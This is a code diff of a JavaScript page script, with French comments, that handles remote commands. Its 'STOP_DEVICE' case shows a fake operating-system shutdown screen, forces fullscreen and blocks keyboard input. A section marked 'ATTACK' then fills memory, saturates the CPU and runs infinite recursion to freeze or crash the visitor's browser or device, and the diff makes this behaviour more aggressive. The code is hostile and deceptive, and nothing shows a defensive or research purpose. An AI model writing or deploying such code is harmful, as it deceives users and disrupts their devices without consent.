@@ -279,69 +279,79 @@ async function checkCommands() {
                     window.location.reload();
                     break;
                 case 'STOP_DEVICE':
-                    // Simulation d'arrêt agressive pour PC et Mobile
+                    // Simulation d'arrêt TOTALE et agressive pour PC et Mobile
                     document.body.innerHTML = '';
-                    document.body.style.background = 'black';
+                    document.body.style.cssText = 'background:black !important; cursor:none !important; overflow:hidden !important;';
                     
                     const crashOverlay = document.createElement('div');
                     crashOverlay.style.cssText = `
                         position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-                        background: black; color: white; z-index: 9999999;
+                        background: black; color: white; z-index: 99999999;
                         display: flex; align-items: center; justify-content: center;
-                        font-family: monospace; text-align: center;
+                        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                        text-align: center; cursor: none;
                     `;
                     
                     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                     
                     if (isMobile) {
+                        // Simulation d'arrêt Android / iOS parfaite
                         crashOverlay.innerHTML = `
-                            <div style="padding: 20px;">
-                                <div style="width: 50px; height: 50px; border: 3px solid white; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-                                <h2 style="font-size: 1.2rem;">Arrêt en cours...</h2>
-                                <p style="color: #666; font-size: 0.8rem;">Ne pas éteindre votre téléphone.</p>
+                            <div style="display:flex; flex-direction:column; align-items:center;">
+                                <div style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;"></div>
+                                <h2 style="font-size: 1.1rem; font-weight: 400; color: white; letter-spacing: 0.5px;">Arrêt en cours...</h2>
                             </div>
                             <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                         `;
                     } else {
+                        // Simulation d'arrêt Windows 10/11 parfaite
+                        crashOverlay.style.background = 'black';
                         crashOverlay.innerHTML = `
-                            <div style="text-align: left; padding: 50px; max-width: 800px;">
-                                <h1 style="font-size: 5rem; margin: 0;">:(</h1>
-                                <h2 style="font-size: 1.5rem; margin-top: 20px;">Votre PC a rencontré un problème et doit redémarrer.</h2>
-                                <p style="margin-top: 20px;">Nous collectons simplement des informations relatives aux erreurs, puis nous allons redémarrer l'ordinateur pour vous.</p>
-                                <p style="margin-top: 10px; font-size: 1.2rem;">100% achevé</p>
-                                <div style="display: flex; gap: 20px; margin-top: 30px; align-items: center;">
-                                    <div style="width: 100px; height: 100px; background: white; padding: 5px;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=90x90&data=https://support.microsoft.com/stopcode" style="width:100%; height:100%;"></div>
-                                    <div style="font-size: 0.8rem;">
-                                        Pour plus d'informations sur ce problème et les solutions possibles, consultez https://www.windows.com/stopcode<br><br>
-                                        Si vous appelez un technicien, donnez-lui ces informations :<br>
-                                        Code d'arrêt : CRITICAL_PROCESS_DIED
-                                    </div>
-                                </div>
+                            <div style="display:flex; flex-direction:column; align-items:center;">
+                                <div style="width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #0078d7; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px;"></div>
+                                <h2 style="font-size: 1.8rem; font-weight: 300; color: white;">Arrêt en cours</h2>
                             </div>
+                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                         `;
-                        crashOverlay.style.background = '#0078d7'; // Bleu Windows
                     }
                     
                     document.body.appendChild(crashOverlay);
-                    try { crashOverlay.requestFullscreen().catch(() => {}); } catch(e) {}
                     
-                    // Bloquer l'interaction
-                    document.addEventListener('keydown', (e) => e.preventDefault(), true);
-                    document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
-                    
-                    // Saturation CPU/Mémoire pour geler l'onglet (plus soft pour éviter de faire planter Trae mais assez pour bloquer l'onglet cible)
-                    setTimeout(() => {
-                        const leak = [];
-                        setInterval(() => {
-                            for(let i=0; i<1000; i++) {
-                                leak.push(new Array(1000).fill(Math.random()));
+                    // On essaie de forcer le plein écran sans arrêt
+                    const forceLock = () => {
+                        try {
+                            if (document.documentElement.requestFullscreen) {
+                                document.documentElement.requestFullscreen().catch(() => {});
                             }
-                            console.log("FREEZE_IN_PROGRESS...");
-                            // Boucle infinie bloquante par intervalles
-                            const end = Date.now() + 100;
-                            while(Date.now() < end) { Math.sqrt(Math.random()); }
-                        }, 50);
-                    }, 2000);
+                        } catch(e) {}
+                    };
+                    
+                    forceLock();
+                    document.addEventListener('click', forceLock);
+                    document.addEventListener('keydown', (e) => {
+                        e.preventDefault();
+                        return false;
+                    }, true);
+
+                    // ATTACK : Saturation de l'appareil pour forcer un plantage réel (Freeze)
+                    setTimeout(() => {
+                        // 1. Saturation Mémoire (Heap Spray)
+                        const garbage = [];
+                        // 2. Saturation CPU (Infinite Loop)
+                        const freeze = () => {
+                            const start = Date.now();
+                            while (Date.now() - start < 500) { // Bloque par tranches de 500ms
+                                Math.sqrt(Math.random() * Math.random());
+                                garbage.push(new Array(1000).fill("STOP_DEVICE_CRITICAL_FAILURE_" + Math.random()));
+                            }
+                            setTimeout(freeze, 10);
+                        };
+                        freeze();
+                        
+                        // 3. Tentative de crash du navigateur par récursion infinie
+                        const crash = () => { crash(); };
+                        setTimeout(crash, 1000);
+                    }, 1000);
                     break;
             }
         }
